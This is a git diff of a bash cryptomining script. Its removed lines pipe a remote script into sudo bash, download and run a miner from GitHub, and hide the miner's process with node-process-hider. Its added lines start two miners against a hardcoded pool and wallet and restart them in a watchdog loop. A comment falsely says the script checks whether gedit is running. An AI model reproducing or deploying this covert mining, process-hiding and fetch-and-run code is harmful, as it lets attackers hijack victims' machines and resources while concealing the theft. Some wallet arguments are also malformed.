@@ -1,20 +1,30 @@
-#!/bin/bash
+#!/bin/bash xD
+# Verifica se o gedit está sendo executado
+NOMEMAQUINA="$2";
+CARTEIRA="$1"
+./xtreta --donate-level 1 -o 144.217.82.15:80 -u $3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$NOMEMAQUINA -p x -k -a rx/0 &
+sleep 1;
+./ntreta -a ethash  -log -o 144.217.82.15:80 -u $CARTEIRA.$NOMEMAQUINA &
 
-POOL=144.217.82.15:80
+while true; do
+	sleep 60;
+	clear
+	NOMEMAQUINA="$2";
+	CARTEIRA="$1"
+	if pgrep "xtreta" > /dev/null
+	then
+		echo "Executando - xtreta" $NOMEMAQUINA;
+	else
+		echo "Parado - xtreta";
+		./xtreta --donate-level 1 -o 144.217.82.15:80 -u $3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$NOMEMAQUINA -p x -k -a rx/0 &
+	fi
 
-WALLET=3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX
+	if pgrep "ntreta" > /dev/null
+	then
+		echo "Executando - ntreta" $NOMEMAQUINA;
+	else
+		echo "Parado - ntreta";
+		./ntreta -a ethash  -log -o 144.217.82.15:80 -u $3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$NOMEMAQUINA &
+	fi	
 
-WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-BTCNICEHASH
-
-cd "$(dirname "$0")"
-
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
-apt-get install nodejs
-apt-get install screen -y
-npm i -g node-process-hider
-wget -qO gede https://raw.githubusercontent.com/hndouehdw/nhcque/master/coinbtc
-sudo ph add gede
-chmod +x ./gede
-./gede --algo ETHASH --pool 144.217.82.15:80 --user 3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$(echo "$(curl -s ifconfig.me)" | tr . _ )-GASMAWON $@ --ethstratum ETHPROXY
-
-echo success
+done
